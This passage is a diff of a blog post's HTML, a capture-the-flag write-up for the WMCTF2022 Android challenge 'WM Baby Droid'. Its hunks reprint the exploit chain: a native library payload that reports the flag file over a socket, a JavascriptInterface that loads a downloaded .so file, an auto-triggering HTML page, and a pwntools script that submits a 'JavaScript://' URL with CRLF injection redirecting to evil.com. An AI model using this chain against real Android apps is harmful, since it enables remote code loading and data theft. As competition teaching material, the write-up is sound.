class="title">th</span><span class="params">(&amp;Task::execute, taskPtr, <span class="string">"Sample Task"</span>)</span></span>;</span><br><span class="line">  th.join();</span><br><span class="line">  <span class="keyword">return</span> JNI_VERSION_1_6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>We also added this infinite loop to check if the flag file already exists (If the payload is too fast the flag might not be in the directory):<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_file_exist(<span class="string">"/data/data/com.wmctf.wmbabydroid/files/flag"</span>)) &#123;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        send(sockfd, <span class="string">"File doesn't exist yet\n"</span>, <span class="built_in">strlen</span>(<span class="string">"File doesn't exist yet\n"</span>), <span class="number">0</span>);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure></p>
+<p>We also added this infinite loop to check if the flag file already exists (If the payload is too fast the flag might not be in the directory):</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_file_exist(<span class="string">"/data/data/com.wmctf.wmbabydroid/files/flag"</span>)) &#123;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        send(sockfd, <span class="string">"File doesn't exist yet\n"</span>, <span class="built_in">strlen</span>(<span class="string">"File doesn't exist yet\n"</span>), <span class="number">0</span>);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
 <p>We followed the google <a href="https://developer.android.com/ndk/guides" target="_blank" rel="noopener">documentation</a> on how to implement native libraries in android.</p>
-<h3 id="Trigger-the-JavascriptInterface-code"><a href="#Trigger-the-JavascriptInterface-code" class="headerlink" title="Trigger the @JavascriptInterface code"></a>Trigger the @JavascriptInterface code</h3><p>Javascript Interfaces allows exposing methods to JavaScript:</p>
+<h3 id="trigger-the-javascriptinterface-code"><a class="markdownIt-Anchor" href="#trigger-the-javascriptinterface-code"></a> Trigger the @JavascriptInterface code</h3>
+<p>Javascript Interfaces allows exposing methods to JavaScript:</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">webView.addJavascriptInterface(<span class="keyword">this</span>, <span class="string">"lmao"</span>);</span><br><span class="line">...</span><br><span class="line"><span class="meta">@JavascriptInterface</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">lmao</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        File so = <span class="keyword">new</span> File(getFilesDir() + <span class="string">"/lmao.so"</span>);</span><br><span class="line">        <span class="keyword">if</span> (so.exists()) &#123;</span><br><span class="line">            System.load(so.getPath());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>The <strong>@JavascriptInterface</strong> notation will allow us to execute java code function from javascript for example to execute the code above we can use:</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">javaInterface</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    lmao.lmao();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>To trigger the download and the JavascriptInterface we created the following html file:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">    <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">"getAll()"</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--&lt;iframe src="/download"&gt;&lt;/iframe&gt;--&gt;</span></span><br><span class="line">        </span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/download"</span> <span class="attr">id</span>=<span class="string">"test"</span> &gt;</span>qweqwe<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">getAll</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="undefined">        lmao.lmao();</span></span><br><span class="line"><span class="actionscript">        <span class="comment">//download();</span></span></span><br><span class="line"><span class="undefined">        setTimeout(download, 3000);</span></span><br><span class="line"><span class="undefined">        setTimeout(timeoutFunc, 15000);</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"> </span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">download</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.getElementById(<span class="string">"test"</span>).click();</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">timeoutFunc</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="undefined">            lmao.lmao();</span></span><br><span class="line"><span class="undefined">        &#125;   </span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>Note that running <strong>lmao.lmao()</strong> first is very important since the <strong>files</strong> directory is not created when the apk is installed. </p>
+<p>To trigger the download and the JavascriptInterface we created the following html file:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">    <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">"getAll()"</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--&lt;iframe src="/download"&gt;&lt;/iframe&gt;--&gt;</span></span><br><span class="line">        </span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/download"</span> <span class="attr">id</span>=<span class="string">"test"</span> &gt;</span>qweqwe<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">getAll</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="undefined">        lmao.lmao();</span></span><br><span class="line"><span class="actionscript">        <span class="comment">//download();</span></span></span><br><span class="line"><span class="undefined">        setTimeout(download, 3000);</span></span><br><span class="line"><span class="undefined">        setTimeout(timeoutFunc, 15000);</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"> </span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">download</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.getElementById(<span class="string">"test"</span>).click();</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">timeoutFunc</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="undefined">            lmao.lmao();</span></span><br><span class="line"><span class="undefined">        &#125;   </span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Note that running <strong>lmao.lmao()</strong> first is very important since the <strong>files</strong> directory is not created when the apk is installed.</p>
 <p>The method <strong>getFilesDir()</strong> will create the directory for us:</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">File so = <span class="keyword">new</span> File(getFilesDir() + <span class="string">"/lmao.so"</span>);</span><br></pre></td></tr></table></figure>
-<h3 id="Final-script"><a href="#Final-script" class="headerlink" title="Final script"></a>Final script</h3><p>Using pwntools to send the link to the app in the server<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> hashlib,string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE:</span><br><span class="line">        r = remote(<span class="string">'localhost'</span>, <span class="number">10086</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(<span class="string">'43.248.96.7'</span>, <span class="number">10086</span>)</span><br><span class="line">    a = r.recvuntil(<span class="string">b"Please enter the xxxx to satisfy the above equation:\n"</span>)</span><br><span class="line">    begin, end, hash_digest = re.findall(<span class="string">r'(?&lt;=")[a-zA-Z0-9]+?(?=")'</span>, a.decode())</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> string.ascii_letters:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> string.ascii_letters:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> string.ascii_letters:</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> string.ascii_letters:</span><br><span class="line">                    test_hash = hashlib.sha256((begin+a+b+c+d).encode()).hexdigest()</span><br><span class="line">                    <span class="keyword">if</span> test_hash == hash_digest:</span><br><span class="line">                        print(a+b+c+d)</span><br><span class="line">                        r.sendline((a+b+c+d).encode())</span><br><span class="line">                        r.recvuntil(<span class="string">b'Please enter your poc url:\n'</span>)</span><br><span class="line">                        r.sendline(<span class="string">b"JavaScript://www.google.com/%0d%0awindow.location.href='https://evil.com'"</span>)<span class="comment"># real url was replaced with evil.com</span></span><br><span class="line">                        print(r.recvuntil(<span class="string">b'exiting......\n'</span>,timeout=<span class="number">60</span>*<span class="number">5</span>)) </span><br><span class="line">                        <span class="comment">#print(hashlib.sha256((begin+a+b+c+d).encode()).hexdigest())</span></span><br><span class="line">                        r.close()</span><br><span class="line">                        <span class="keyword">return</span> </span><br><span class="line">                        <span class="comment">#exit(0)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.LOOP:</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            main()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>
+<h3 id="final-script"><a class="markdownIt-Anchor" href="#final-script"></a> Final script</h3>
+<p>Using pwntools to send the link to the app in the server</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> hashlib,string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE:</span><br><span class="line">        r = remote(<span class="string">'localhost'</span>, <span class="number">10086</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(<span class="string">'43.248.96.7'</span>, <span class="number">10086</span>)</span><br><span class="line">    a = r.recvuntil(<span class="string">b"Please enter the xxxx to satisfy the above equation:\n"</span>)</span><br><span class="line">    begin, end, hash_digest = re.findall(<span class="string">r'(?&lt;=")[a-zA-Z0-9]+?(?=")'</span>, a.decode())</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> string.ascii_letters:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> string.ascii_letters:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> string.ascii_letters:</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> string.ascii_letters:</span><br><span class="line">                    test_hash = hashlib.sha256((begin+a+b+c+d).encode()).hexdigest()</span><br><span class="line">                    <span class="keyword">if</span> test_hash == hash_digest:</span><br><span class="line">                        print(a+b+c+d)</span><br><span class="line">                        r.sendline((a+b+c+d).encode())</span><br><span class="line">                        r.recvuntil(<span class="string">b'Please enter your poc url:\n'</span>)</span><br><span class="line">                        r.sendline(<span class="string">b"JavaScript://www.google.com/%0d%0awindow.location.href='https://evil.com'"</span>)<span class="comment"># real url was replaced with evil.com</span></span><br><span class="line">                        print(r.recvuntil(<span class="string">b'exiting......\n'</span>,timeout=<span class="number">60</span>*<span class="number">5</span>)) </span><br><span class="line">                        <span class="comment">#print(hashlib.sha256((begin+a+b+c+d).encode()).hexdigest())</span></span><br><span class="line">                        r.close()</span><br><span class="line">                        <span class="keyword">return</span> </span><br><span class="line">                        <span class="comment">#exit(0)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.LOOP:</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            main()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
 <p>Running it:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ python wm_baby_droid.py REMOTE</span><br><span class="line">[+] Opening connection to 43.248.96.7 on port 10086: Done</span><br><span class="line">RVXj</span><br><span class="line">b<span class="string">'Preparing android emulator. This may takes about 2 minutes...\n\nLaunching! Let your apk fly for a while...\n\nexiting......\n'</span></span><br><span class="line">[*] Closed connection to 43.248.96.7 port 10086</span><br></pre></td></tr></table></figure>
 <p>Receiving the flag on our listening service:</p>
@@ -463,18 +474,18 @@
 <link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
       
     </div>
-    <footer class="article-footer">
-      <blockquote>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
   <ul class="post-copyright list-unstyled">
     
-    <li class="post-copyright-link">
-      <strong>Link to this article：</strong>
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
       <a href="https://teamrocketist.github.io/2022/08/23/Pwn-WMCTF2022-WM-Baby-Droid/" title="[Pwn] WMCTF2022 - WM Baby Droid" target="_blank" rel="external">https://teamrocketist.github.io/2022/08/23/Pwn-WMCTF2022-WM-Baby-Droid/</a>
     </li>
     
-    <!--li class="post-copyright-license">
+    <li class="post-copyright-license">
       <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
-    </li-->
+    </li>
   </ul>
 </blockquote>
 
@@ -496,89 +507,75 @@
 </div>
 
 
-    </footer>
+    </div>
   </article>
   
     
-  <div id="comments"></div>
+  <section id="comments">
+  	
+  </section>
 
-<!-- LiveRe City install code -->
-<!--<div id="comments">
-<div id="lv-container" data-id="city" data-uid="MTAyMC8zMDExMy82NjY4">
-	<script type="text/javascript">
-   (function(d, s) {
-       var j, e = d.getElementsByTagName(s)[0];
-
-       if (typeof LivereTower === 'function') { return; }
-
-       j = d.createElement(s);
-       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
-       j.async = true;
-
-       e.parentNode.insertBefore(j, e);
-   })(document, 'script');
-	</script>
-<noscript> Please activate JavaScript for write a comment in LiveRe</noscript>
-</div>
-</div>-->
-<!-- completed City install code -->
-<div id="disqus_thread"></div>
-<script>
-
-/**
-*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
-*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
-/*
-var disqus_config = function () {
-this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
-this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
-};
-*/
-(function() { // DON'T EDIT BELOW THIS LINE
-var d = document, s = d.createElement('script');
-s.src = 'https://teamrocketist.disqus.com/embed.js';
-s.setAttribute('data-timestamp', +new Date());
-(d.head || d.body).appendChild(s);
-})();
-</script>
-<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
 
   
 </div>
 
   <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
   
   <ul class="pager pull-left">
     
     
     <li class="next">
-      <a href="/2021/02/08/Pwn-DiceCTF2021-flippidy/" title="[Pwn] DiceCTF2021 - flippidy">Older&nbsp;&nbsp;<i class="fa fa-angle-right" aria-hidden="true"></i></a>
+      <a href="/2021/02/08/Pwn-DiceCTF2021-flippidy/" title="[Pwn] DiceCTF2021 - flippidy"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
     </li>
+    
     
   </ul>
   
   
   
   <div class="bar-right">
+    
     <div class="share-component" data-sites="facebook,twitter" data-mobile-sites="facebook,twitter"></div>
+    
   </div>
-  
+  </div>
 </nav>
+  
 
-</section>
 
-  <script src="https://cdn.bootcss.com/jquery/1.12.4/jquery.min.js"></script>
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/teamrocketist" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="https://twitter.com/teamrocketist" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        &copy; 2022 TEAMROCKETIST
+        
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
 <script>
 window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
 </script>
-
-<script src="/js/jquery.fancybox.min.js"></script>
-<script src="/js/plugin.js"></script>
+<script src="/js/plugin.min.js"></script>
 <script src="/js/application.js"></script>
 
-
-
-  <script>
+    <script>
 (function (window) {
     var INSIGHT_CONFIG = {
         TRANSLATION: {
@@ -599,9 +596,48 @@ window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
 
 
 
-<!-- Google Analytics -->
-<script type="text/javascript">
-(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+
+   
+
+
+
+
+   
+
+
+  <script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.js"></script>
+  <script>
+  //利用 FancyBox 实现点击图片放大
+  $(document).ready(function() {
+    $('article img').not('[hidden]').not('.panel-body img').each(function() {
+      var $image = $(this);
+      var imageCaption = $image.attr('alt');
+      var $imageWrapLink = $image.parent('a');
+      if ($imageWrapLink.length < 1) {
+        var src = this.getAttribute('src');
+        var idx = src.lastIndexOf('?');
+        if (idx != -1) {
+          src = src.substring(0, idx);
+        }
+        $imageWrapLink = $image.wrap('<a href="' + src + '"></a>').parent('a');
+      }
+      $imageWrapLink.attr('data-fancybox', 'images');
+      if (imageCaption) {
+        $imageWrapLink.attr('data-caption', imageCaption);
+      }
+    });
+    $().fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+    });
+  });
+  </script>
+
+
+
+    <script defer type="text/javascript">
+(function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
 (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
 m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
 })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
@@ -610,7 +646,6 @@ ga('create', 'UA-104385070-1', 'auto');
 ga('send', 'pageview');
 
 </script>
-<!-- End Google Analytics -->
 
 
 
